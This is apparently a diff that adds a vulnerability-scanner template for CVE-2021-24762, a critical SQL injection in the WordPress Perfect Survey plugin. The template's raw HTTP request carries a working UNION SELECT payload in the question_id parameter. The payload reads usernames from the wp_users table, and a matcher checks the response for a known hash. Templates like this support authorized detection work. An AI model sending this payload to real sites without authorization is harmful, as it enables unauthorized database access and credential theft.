@@ -1,0 +1,29 @@
+id: CVE-2021-24762
+info:
+  name: WordPress plugin perfect survey admin-ajax.php question_id SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress plugin perfect survey version before 1.5.2 has a SQL injection vulnerability. The vulnerability stems from the lack of validation of externally input SQL statements in database-based applications. Attackers can exploit this vulnerability to execute illegal SQL commands to obtain sensitive information such as user passwords.
+  reference:
+    - https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad
+  classification:
+    cve-id: CVE-2021-24762
+    cvss-score: 9.8
+  tags: sql
+
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cmd5(123)%2C0%2C0%2Cmd5(123)%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b70"
